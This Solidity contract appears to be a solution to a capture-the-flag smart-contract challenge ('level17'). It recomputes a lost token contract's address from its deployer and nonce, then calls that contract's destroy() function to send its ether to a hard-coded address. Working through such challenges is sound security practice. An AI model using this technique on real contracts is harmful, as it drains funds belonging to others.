// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level17.sol";

contract Attacker
{
    function exploit() external 
    {
        address payable lostcontract = payable(address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0x882df2eAf842580a4C7c98F6D6Ff772094276c0C), bytes1(0x01)))))));
        SimpleToken level17 = SimpleToken(lostcontract);
        level17.destroy(payable(0x6025dCF80ac58FC9Bf3Dc3cBb1572A0A44dafE0a));
    }
}